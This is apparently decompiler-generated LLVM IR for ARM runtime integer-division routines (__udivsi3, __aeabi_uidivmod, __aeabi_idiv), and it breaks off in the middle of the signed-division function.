define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12a80 = load i32, i32* @r1, align 4
  %v1_12a80 = add i32 %v0_12a80, -1
  store i32 %v1_12a80, i32* %r2.global-to-local, align 4
  %v2_12a80 = icmp eq i32 %v0_12a80, 0
  %v7_12a80 = icmp eq i32 %v0_12a80, 1
  %v0_12a84 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12a80, i32 %v0_12a84)
  br i1 %v2_12a80, label %dec_label_pc_12b68, label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %entry
  %v0_12a8c = load i32, i32* %r0.global-to-local, align 4
  %v1_12a8c = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_12a8c, %v1_12a8c
  br i1 %tmp, label %dec_label_pc_12a94, label %dec_label_pc_12b20

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a8c
  %v1_12a94 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a94 = and i32 %v1_12a94, %v1_12a8c
  %v4_12a94 = icmp eq i32 %v2_12a94, 0
  br i1 %v4_12a94, label %dec_label_pc_12b2c, label %dec_label_pc_12a9c

dec_label_pc_12a9c:                               ; preds = %dec_label_pc_12a94
  %v3_12a9c = icmp ult i32 %v1_12a8c, 536870912
  br i1 %v3_12a9c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12a9c
  %v4_12aa0 = mul i32 %v1_12a8c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12a9c, %.thread
  %v0_12ac0.pr36.ph = phi i32 [ %v4_12aa0, %.thread ], [ %v1_12a8c, %dec_label_pc_12a9c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12a9c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_12ac0.pr36 = phi i32 [ %v4_12ab4, %bb81 ], [ %v0_12ac0.pr36.ph, %.preheader.preheader ]
  %v1_12ab8 = phi i32 [ %v4_12ab8, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_12aac = icmp ugt i32 %v0_12ac0.pr36, 268435455
  br i1 %v2_12aac, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12ac0thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_12ab0 = icmp ult i32 %v0_12ac0.pr36, %v0_12a8c
  br i1 %v4_12ab0, label %bb80, label %dec_label_pc_12ac0thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_12ab4 = and i32 %v0_12ac0.pr36, 268435456
  %v3_12ab4 = icmp eq i32 %v2_12ab4, 0
  %v4_12ab4 = mul i32 %v0_12ac0.pr36, 16
  br i1 %v3_12ab4, label %bb81, label %dec_label_pc_12ac0.loopexit

bb81:                                             ; preds = %bb80
  %v2_12ab8 = and i32 %v1_12ab8, 268435456
  %v3_12ab8 = icmp eq i32 %v2_12ab8, 0
  %v4_12ab8 = mul i32 %v1_12ab8, 16
  br i1 %v3_12ab8, label %.preheader, label %dec_label_pc_12ac0thread-pre-split.loopexit.loopexit

dec_label_pc_12ac0thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_12acc48.ph = phi i32 [ %v1_12ab8, %bb ], [ %v4_12ab8, %bb81 ]
  %v0_12ac0.pr38.ph = phi i32 [ %v0_12ac0.pr36, %bb ], [ %v4_12ab4, %bb81 ]
  br label %dec_label_pc_12ac0thread-pre-split.loopexit

dec_label_pc_12ac0thread-pre-split.loopexit:      ; preds = %dec_label_pc_12ac0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_12acc48 = phi i32 [ %v1_12ab8, %.thread2 ], [ %v1_12acc48.ph, %dec_label_pc_12ac0thread-pre-split.loopexit.loopexit ]
  %v0_12ac0.pr38 = phi i32 [ %v0_12ac0.pr36, %.thread2 ], [ %v0_12ac0.pr38.ph, %dec_label_pc_12ac0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12ac0thread-pre-split

dec_label_pc_12ac0thread-pre-split:               ; preds = %dec_label_pc_12ac0thread-pre-split.loopexit, %bb83
  %v1_12acc46 = phi i32 [ %v1_12acc48, %dec_label_pc_12ac0thread-pre-split.loopexit ], [ %v3_12acc, %bb83 ]
  %v0_12ac0.pr = phi i32 [ %v0_12ac0.pr38, %dec_label_pc_12ac0thread-pre-split.loopexit ], [ %v3_12ac8, %bb83 ]
  br label %dec_label_pc_12ac0

dec_label_pc_12ac0.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_12ac0

dec_label_pc_12ac0:                               ; preds = %dec_label_pc_12ac0.loopexit, %dec_label_pc_12ac0thread-pre-split
  %v1_12acc = phi i32 [ %v1_12acc46, %dec_label_pc_12ac0thread-pre-split ], [ %v1_12ab8, %dec_label_pc_12ac0.loopexit ]
  %v1_12ac8 = phi i32 [ %v0_12ac0.pr, %dec_label_pc_12ac0thread-pre-split ], [ %v4_12ab4, %dec_label_pc_12ac0.loopexit ]
  %v2_12ac0 = icmp slt i32 %v1_12ac8, 0
  br i1 %v2_12ac0, label %dec_label_pc_12ad4, label %bb82

bb82:                                             ; preds = %dec_label_pc_12ac0
  %v4_12ac4 = icmp ult i32 %v1_12ac8, %v0_12a8c
  br i1 %v4_12ac4, label %bb83, label %dec_label_pc_12ad4

bb83:                                             ; preds = %bb82
  %v3_12ac8 = mul i32 %v1_12ac8, 2
  %v2_12acc = icmp slt i32 %v1_12acc, 0
  %v3_12acc = mul i32 %v1_12acc, 2
  br i1 %v2_12acc, label %dec_label_pc_12ad4, label %dec_label_pc_12ac0thread-pre-split

dec_label_pc_12ad4:                               ; preds = %bb82, %dec_label_pc_12ac0, %bb83
  %v2_12ae059 = phi i32 [ %v3_12acc, %bb83 ], [ %v1_12acc, %bb82 ], [ %v1_12acc, %dec_label_pc_12ac0 ]
  %v1_12ad851 = phi i32 [ %v3_12ac8, %bb83 ], [ %v1_12ac8, %bb82 ], [ %v1_12ac8, %dec_label_pc_12ac0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ad8

dec_label_pc_12ad8:                               ; preds = %.thread11, %dec_label_pc_12ad4
  %v1_12b0c = phi i32 [ %v4_12b0c, %.thread11 ], [ %v2_12ae059, %dec_label_pc_12ad4 ]
  %v1_12ae0 = phi i32 [ %v0_12b18, %.thread11 ], [ 0, %dec_label_pc_12ad4 ]
  %v1_12b10 = phi i32 [ %v4_12b10, %.thread11 ], [ %v1_12ad851, %dec_label_pc_12ad4 ]
  %v1_12adc = phi i32 [ %v0_12b08, %.thread11 ], [ %v0_12a8c, %dec_label_pc_12ad4 ]
  %v3_12ad8 = icmp ult i32 %v1_12adc, %v1_12b10
  br i1 %v3_12ad8, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_12ad8
  %v3_12adc = sub i32 %v1_12adc, %v1_12b10
  store i32 %v3_12adc, i32* %r0.global-to-local, align 4
  %v3_12ae0 = or i32 %v1_12ae0, %v1_12b0c
  store i32 %v3_12ae0, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12ad8, %bb84
  %v1_12ae8 = phi i32 [ %v1_12adc, %dec_label_pc_12ad8 ], [ %v3_12adc, %bb84 ]
  %v1_12aec = phi i32 [ %v1_12ae0, %dec_label_pc_12ad8 ], [ %v3_12ae0, %bb84 ]
  %v4_12ae4 = udiv i32 %v1_12b10, 2
  %v6_12ae4 = icmp ult i32 %v1_12ae8, %v4_12ae4
  br i1 %v6_12ae4, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_12ae8 = urem i32 %v1_12b10, 2
  %v4_12ae8 = icmp eq i32 %v3_12ae8, 0
  %v6_12ae8 = sub i32 %v1_12ae8, %v4_12ae4
  store i32 %v6_12ae8, i32* %r0.global-to-local, align 4
  br i1 %v4_12ae8, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_12aec = udiv i32 %v1_12b0c, 2
  %v6_12aec = or i32 %v1_12aec, %v5_12aec
  store i32 %v6_12aec, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_12af4 = phi i32 [ %v6_12ae8, %bb85 ], [ %v1_12ae8, %.thread7 ], [ %v6_12ae8, %bb86 ]
  %v1_12af8 = phi i32 [ %v1_12aec, %bb85 ], [ %v1_12aec, %.thread7 ], [ %v6_12aec, %bb86 ]
  %v4_12af0 = udiv i32 %v1_12b10, 4
  %v6_12af0 = icmp ult i32 %v1_12af4, %v4_12af0
  br i1 %v6_12af0, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_12af4 = and i32 %v1_12b10, 2
  %v4_12af4 = icmp eq i32 %v3_12af4, 0
  %v6_12af4 = sub i32 %v1_12af4, %v4_12af0
  store i32 %v6_12af4, i32* %r0.global-to-local, align 4
  br i1 %v4_12af4, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12af8 = udiv i32 %v1_12b0c, 4
  %v6_12af8 = or i32 %v1_12af8, %v5_12af8
  store i32 %v6_12af8, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_12b00 = phi i32 [ %v6_12af4, %bb87 ], [ %v1_12af4, %.thread8 ], [ %v6_12af4, %bb88 ]
  %v1_12b04 = phi i32 [ %v1_12af8, %bb87 ], [ %v1_12af8, %.thread8 ], [ %v6_12af8, %bb88 ]
  %v4_12afc = udiv i32 %v1_12b10, 8
  %v6_12afc = icmp ult i32 %v1_12b00, %v4_12afc
  br i1 %v6_12afc, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_12b00 = and i32 %v1_12b10, 4
  %v4_12b00 = icmp eq i32 %v3_12b00, 0
  %v6_12b00 = sub i32 %v1_12b00, %v4_12afc
  store i32 %v6_12b00, i32* %r0.global-to-local, align 4
  br i1 %v4_12b00, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12b04 = udiv i32 %v1_12b0c, 8
  %v6_12b04 = or i32 %v1_12b04, %v5_12b04
  store i32 %v6_12b04, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_12b18 = phi i32 [ %v1_12b04, %bb89 ], [ %v1_12b04, %.thread9 ], [ %v6_12b04, %bb90 ]
  %v0_12b08 = phi i32 [ %v6_12b00, %bb89 ], [ %v1_12b00, %.thread9 ], [ %v6_12b00, %bb90 ]
  %v2_12b08 = icmp eq i32 %v0_12b08, 0
  br i1 %v2_12b08, label %dec_label_pc_12b18, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_12b0c, 16
  br i1 %tmp138, label %dec_label_pc_12b18, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_12b0c = udiv i32 %v1_12b0c, 16
  %v4_12b10 = udiv i32 %v1_12b10, 16
  br label %dec_label_pc_12ad8

dec_label_pc_12b18:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_12b18, i32* %r0.global-to-local, align 4
  ret i32 %v0_12b18

dec_label_pc_12b20:                               ; preds = %dec_label_pc_12a8c
  %v9_12a8c = icmp eq i32 %v0_12a8c, %v1_12a8c
  %. = zext i1 %v9_12a8c to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_12b2c:                               ; preds = %dec_label_pc_12a94
  %v2_12b2c = icmp ugt i32 %v1_12a8c, 65535
  br i1 %v2_12b2c, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_12b2c
  %v2_12b30 = and i32 %v1_12a8c, 32768
  %v3_12b30 = icmp eq i32 %v2_12b30, 0
  %v4_12b30 = udiv i32 %v1_12a8c, 65536
  br i1 %v3_12b30, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_12b2c
  %v0_12b3c65 = phi i32 [ %v1_12a8c, %dec_label_pc_12b2c ], [ %v4_12b30, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_12b40 = phi i32 [ %v0_12b3c65, %.thread16 ], [ %v4_12b30, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_12b3c = icmp ugt i32 %v1_12b40, 255
  br i1 %v2_12b3c, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_12b40 = and i32 %v1_12b40, 128
  %v3_12b40 = icmp eq i32 %v2_12b40, 0
  %v4_12b40 = udiv i32 %v1_12b40, 256
  br i1 %v3_12b40, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_12b44 = or i32 %storemerge, 8
  store i32 %v2_12b44, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_12b50 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_12b44, %bb98 ]
  %v1_12b4c = phi i32 [ %v1_12b40, %bb96 ], [ %v4_12b40, %bb97 ], [ %v4_12b40, %bb98 ]
  %v2_12b48 = icmp ugt i32 %v1_12b4c, 15
  br i1 %v2_12b48, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_12b4c = and i32 %v1_12b4c, 8
  %v3_12b4c = icmp eq i32 %v2_12b4c, 0
  %v4_12b4c = udiv i32 %v1_12b4c, 16
  br i1 %v3_12b4c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12b50 = add nsw i32 %v1_12b50, 4
  store i32 %v2_12b50, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_12b58 = phi i32 [ %v1_12b50, %.thread17 ], [ %v1_12b50, %bb99 ], [ %v2_12b50, %bb100 ]
  %v5_12b5c = phi i32 [ %v1_12b4c, %.thread17 ], [ %v4_12b4c, %bb99 ], [ %v4_12b4c, %bb100 ]
  %v2_12b54 = icmp ugt i32 %v5_12b5c, 3
  %v7_12b54 = icmp eq i32 %v5_12b5c, 4
  %v2_12b58 = xor i1 %v7_12b54, true
  %v3_12b58 = and i1 %v2_12b54, %v2_12b58
  br i1 %v3_12b58, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_12b58 = add nsw i32 %v4_12b58, 3
  store i32 %v5_12b58, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_12b5c = phi i32 [ %v4_12b58, %.thread18 ], [ %v5_12b58, %bb101 ]
  %v2_12b5c = xor i1 %v2_12b54, true
  %v3_12b5c = or i1 %v7_12b54, %v2_12b5c
  br i1 %v3_12b5c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_12b5c = udiv i32 %v5_12b5c, 2
  %v9_12b5c = add i32 %v4_12b5c, %v8_12b5c
  store i32 %v9_12b5c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12b60 = phi i32 [ %v4_12b5c, %bb102 ], [ %v9_12b5c, %bb103 ]
  %v6_12b60 = lshr i32 %v0_12a8c, %v1_12b60
  store i32 %v6_12b60, i32* %r0.global-to-local, align 4
  ret i32 %v6_12b60

dec_label_pc_12b68:                               ; preds = %entry
  %v0_12b6c = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12b5c, { 1, 0 }
  uselistorder i1 %v7_12b54, { 1, 0 }
  uselistorder i32 %v4_12b4c, { 1, 0 }
  uselistorder i32 %v1_12b4c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12b44, { 1, 0 }
  uselistorder i32 %v4_12b40, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12b40, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b30, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_12b08, { 1, 0 }
  uselistorder i32 %v0_12b18, { 1, 0, 2 }
  uselistorder i32 %v4_12afc, { 1, 0 }
  uselistorder i32 %v1_12b04, { 1, 2, 0 }
  uselistorder i32 %v4_12af0, { 1, 0 }
  uselistorder i32 %v1_12af8, { 1, 2, 0 }
  uselistorder i32 %v4_12ae4, { 1, 0 }
  uselistorder i32 %v1_12aec, { 1, 2, 0 }
  uselistorder i32 %v1_12b10, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12ae0, { 1, 0 }
  uselistorder i32 %v1_12b0c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12acc, { 1, 0 }
  uselistorder i32 %v3_12ac8, { 1, 0 }
  uselistorder i32 %v1_12ac8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12acc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12ab8, { 1, 0 }
  uselistorder i32 %v4_12ab4, { 2, 1, 0 }
  uselistorder i32 %v1_12ab8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12ac0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_12a8c, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_12a8c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12a80, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12b18, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12ad4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ac0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12b80 = udiv i32 %arg1, %arg2
  ret i32 %v2_12b80
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_12b94 = load i32, i32* @r1, align 4
  %v1_12b94 = icmp slt i32 %v0_12b94, 0
  %v2_12b94 = icmp eq i32 %v0_12b94, 0
  %v2_12b98 = xor i32 %v0_12b94, %arg1
  br i1 %v2_12b94, label %dec_label_pc_12cac, label %dec_label_pc_12ba0

dec_label_pc_12ba0:                               ; preds = %entry
  br i1 %v1_12b94, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_12ba0
  %v2_12ba0 = sub i32 0, %v0_12b94
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_12ba0, %bb
  %v1_12c6c = phi i32 [ %v2_12ba0, %bb ], [ %v0_12b94, %dec_label_pc_12ba0 ]
  %v1_12ba4 = add i32 %v1_12c6c, -1
  %v7_12ba4 = icmp eq i32 %v1_12c6c, 1
  br i1 %v7_12ba4, label %dec_label_pc_12c4c, label %dec_label_pc_12bac

dec_label_pc_12bac:                               ; preds = %thread-pre-split
  %v1_12bac = icmp slt i32 %arg1, 0
  br i1 %v1_12bac, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_12bac
  %v2_12bb0 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12bac, %bb85
  %v0_12ca0 = phi i32 [ %arg1, %dec_label_pc_12bac ], [ %v2_12bb0, %bb85 ]
  %v3_12bb4 = icmp uge i32 %v0_12ca0, %v1_12c6c
  %v9_12bb4 = icmp eq i32 %v0_12ca0, %v1_12c6c
  %v2_12bb8 = xor i1 %v3_12bb4, true
  %v3_12bb8 = or i1 %v9_12bb4, %v2_12bb8
  br i1 %v3_12bb8, label %dec_label_pc_12c58, label %dec_label_pc_12bbc

dec_label_pc_12bbc:                               ; preds = %bb86
  %v2_12bbc = and i32 %v1_12ba4, %v1_12c6c
  %v4_12bbc = icmp eq i32 %v2_12bbc, 0
  br i1 %v4_12bbc, label %dec_label_pc_12c68, label %dec_label_pc_12bc4

dec_label_pc_12bc4:                               ; preds = %dec_label_pc_12bbc
  %v3_12bc4 = icmp ult i32 %v1_12c6c, 536870912
  br i1 %v3_12bc4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12bc4
  %v4_12bc8 = mul i32 %v1_12c6c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12bc4, %.thread
  %v0_12be8.pr40.ph = phi i32 [ %v4_12bc8, %.thread ], [ %v1_12c6c, %dec_label_pc_12bc4 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12bc4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_12be8.pr40 = phi i32 [ %v4_12bdc, %bb89 ], [ %v0_12be8.pr40.ph, %.preheader.preheader ]
  %v1_12be0 = phi i32 [ %v4_12be0, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_12bd4 = icmp ugt i32 %v0_12be8.pr40, 268435455
  br i1 %v2_12bd4, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_12be8thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_12bd8 = icmp ult i32 %v0_12be8.pr40, %v0_12ca0
  br i1 %v4_12bd8, label %bb88, label %dec_label_pc_12be8thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_12bdc = and i32 %v0_12be8.pr40, 268435456
  %v3_12bdc = icmp eq i32 %v2_12bdc, 0
  %v4_12bdc = mul i32 %v0_12be8.pr40, 16
  br i1 %v3_12bdc, label %bb89, label %dec_label_pc_12be8.loopexit

bb89:                                             ; preds = %bb88
  %v2_12be0 = and i32 %v1_12be0, 268435456
  %v3_12be0 = icmp eq i32 %v2_12be0, 0
  %v4_12be0 = mul i32 %v1_12be0, 16
  br i1 %v3_12be0, label %.preheader, label %dec_label_pc_12be8thread-pre-split.loopexit.loopexit

dec_label_pc_12be8thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_12bf452.ph = phi i32 [ %v1_12be0, %bb87 ], [ %v4_12be0, %bb89 ]
  %v0_12be8.pr42.ph = phi i32 [ %v0_12be8.pr40, %bb87 ], [ %v4_12bdc, %bb89 ]
  br label %dec_label_pc_12be8thread-pre-split.loopexit

dec_label_pc_12be8thread-pre-split.loopexit:      ; preds = %dec_label_pc_12be8thread-pre-split.loopexit.loopexit, %.thread3
  %v1_12bf452 = phi i32 [ %v1_12be0, %.thread3 ], [ %v1_12bf452.ph, %dec_label_pc_12be8thread-pre-split.loopexit.loopexit ]
  %v0_12be8.pr42 = phi i32 [ %v0_12be8.pr40, %.thread3 ], [ %v0_12be8.pr42.ph, %dec_label_pc_12be8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12be8thread-pre-split

dec_label_pc_12be8thread-pre-split:               ; preds = %dec_label_pc_12be8thread-pre-split.loopexit, %bb91
  %v1_12bf450 = phi i32 [ %v1_12bf452, %dec_label_pc_12be8thread-pre-split.loopexit ], [ %v3_12bf4, %bb91 ]
  %v2_12bec48 = phi i32 [ %v0_12ca0, %dec_label_pc_12be8thread-pre-split.loopexit ], [ %v2_12bec, %bb91 ]
  %v0_12be8.pr = phi i32 [ %v0_12be8.pr42, %dec_label_pc_12be8thread-pre-split.loopexit ], [ %v3_12bf0, %bb91 ]
  br label %dec_label_pc_12be8

dec_label_pc_12be8.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_12be8

dec_label_pc_12be8:                               ; preds = %dec_label_pc_12be8.loopexit, %dec_label_pc_12be8thread-pre-split
  %v1_12bf4 = phi i32 [ %v1_12bf450, %dec_label_pc_12be8thread-pre-split ], [ %v1_12be0, %dec_label_pc_12be8.loopexit ]
  %v2_12bec = phi i32 [ %v2_12bec48, %dec_label_pc_12be8thread-pre-split ], [ %v0_12ca0, %dec_label_pc_12be8.loopexit ]
  %v1_12bf0 = phi i32 [ %v0_12be8.pr, %dec_label_pc_12be8thread-pre-split ], [ %v4_12bdc, %dec_label_pc_12be8.loopexit ]
  %v2_12be8 = icmp slt i32 %v1_12bf0, 0
  br i1 %v2_12be8, label %dec_label_pc_12bfc, label %bb90

bb90:                                             ; preds = %dec_label_pc_12be8
  %v4_12bec = icmp ult i32 %v1_12bf0, %v2_12bec
  br i1 %v4_12bec, label %bb91, label %dec_label_pc_12bfc

bb91:                                             ; preds = %bb90
  %v3_12bf0 = mul i32 %v1_12bf0, 2
  %v2_12bf4 = icmp slt i32 %v1_12bf4, 0
  %v3_12bf4 = mul i32 %v1_12bf4, 2
  br i1 %v2_12bf4, label %dec_label_pc_12bfc, label %dec_label_pc_12be8thread-pre-split

dec_label_pc_12bfc:                               ; preds = %bb90, %dec_label_pc_12be8, %bb91
  %v2_12c0863 = phi i32 [ %v3_12bf4, %bb91 ], [ %v1_12bf4, %bb90 ], [ %v1_12bf4, %dec_label_pc_12be8 ]
  %v1_12c0055 = phi i32 [ %v3_12bf0, %bb91 ], [ %v1_12bf0, %bb90 ], [ %v1_12bf0, %dec_label_pc_12be8 ]
  br label %dec_label_pc_12c00

dec_label_pc_12c00:                               ; preds = %.thread13, %dec_label_pc_12bfc
  %v1_12c34 = phi i32 [ %v4_12c34, %.thread13 ], [ %v2_12c0863, %dec_label_pc_12bfc ]
  %v1_12c08 = phi i32 [ %v1_12c44, %.thread13 ], [ 0, %dec_label_pc_12bfc ]
  %v1_12c38 = phi i32 [ %v4_12c38, %.thread13 ], [ %v1_12c0055, %dec_label_pc_12bfc ]
  %v1_12c04 = phi i32 [ %v0_12c30, %.thread13 ], [ %v0_12ca0, %dec_label_pc_12bfc ]
  %v3_12c00 = icmp ult i32 %v1_12c04, %v1_12c38
  br i1 %v3_12c00, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_12c00
  %v3_12c04 = sub i32 %v1_12c04, %v1_12c38
  %v3_12c08 = or i32 %v1_12c08, %v1_12c34
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12c00, %bb92
  %v1_12c10 = phi i32 [ %v1_12c04, %dec_label_pc_12c00 ], [ %v3_12c04, %bb92 ]
  %v1_12c14 = phi i32 [ %v1_12c08, %dec_label_pc_12c00 ], [ %v3_12c08, %bb92 ]
  %v4_12c0c = udiv i32 %v1_12c38, 2
  %v6_12c0c = icmp ult i32 %v1_12c10, %v4_12c0c
  br i1 %v6_12c0c, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_12c10 = urem i32 %v1_12c38, 2
  %v4_12c10 = icmp eq i32 %v3_12c10, 0
  %v6_12c10 = sub i32 %v1_12c10, %v4_12c0c
  br i1 %v4_12c10, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_12c14 = udiv i32 %v1_12c34, 2
  %v6_12c14 = or i32 %v1_12c14, %v5_12c14
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_12c1c = phi i32 [ %v6_12c10, %bb93 ], [ %v1_12c10, %.thread8 ], [ %v6_12c10, %bb94 ]
  %v1_12c20 = phi i32 [ %v1_12c14, %bb93 ], [ %v1_12c14, %.thread8 ], [ %v6_12c14, %bb94 ]
  %v4_12c18 = udiv i32 %v1_12c38, 4
  %v6_12c18 = icmp ult i32 %v1_12c1c, %v4_12c18
  br i1 %v6_12c18, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_12c1c = and i32 %v1_12c38, 2
  %v4_12c1c = icmp eq i32 %v3_12c1c, 0
  %v6_12c1c = sub i32 %v1_12c1c, %v4_12c18
  br i1 %v4_12c1c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_12c20 = udiv i32 %v1_12c34, 4
  %v6_12c20 = or i32 %v1_12c20, %v5_12c20
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_12c28 = phi i32 [ %v6_12c1c, %bb95 ], [ %v1_12c1c, %.thread9 ], [ %v6_12c1c, %bb96 ]
  %v1_12c2c = phi i32 [ %v1_12c20, %bb95 ], [ %v1_12c20, %.thread9 ], [ %v6_12c20, %bb96 ]
  %v4_12c24 = udiv i32 %v1_12c38, 8
  %v6_12c24 = icmp ult i32 %v1_12c28, %v4_12c24
  br i1 %v6_12c24, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_12c28 = and i32 %v1_12c38, 4
  %v4_12c28 = icmp eq i32 %v3_12c28, 0
  %v6_12c28 = sub i32 %v1_12c28, %v4_12c24
  br i1 %v4_12c28, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_12c2c = udiv i32 %v1_12c34, 8
  %v6_12c2c = or i32 %v1_12c2c, %v5_12c2c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
